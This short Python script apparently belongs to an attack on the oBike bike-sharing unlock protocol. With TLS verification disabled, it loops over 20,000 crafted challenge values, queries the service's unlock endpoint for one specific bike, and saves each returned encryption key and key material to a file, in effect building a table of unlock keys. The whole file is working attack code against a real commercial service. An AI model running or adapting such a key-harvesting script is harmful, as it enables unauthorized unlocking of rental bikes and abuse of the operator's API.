from obike.http_client import HttpClient
import json
import hexdump
import struct
import sys

f = open('keys_cb_1.txt', 'w+')

bikeno = '041007051'
h = HttpClient(verify=False)
for i in range(0, 20000):
    challenge = struct.pack('<I', i).encode('hex')
    try:
        while True:
            res = h.unlock_pass(bikeno, challenge)['data']
            if res['encryptionKey'] >= 168:
                break
    except:
        continue
    try:
        line = '%s,%s,%s,%s\n' % (challenge, res['encryptionKey'], res['keys'], res['serverTime'])
        sys.stdout.write(line)
        f.write(line)
    except:
        sys.stderr.write(json.dumps(res))
        continue
f.close()
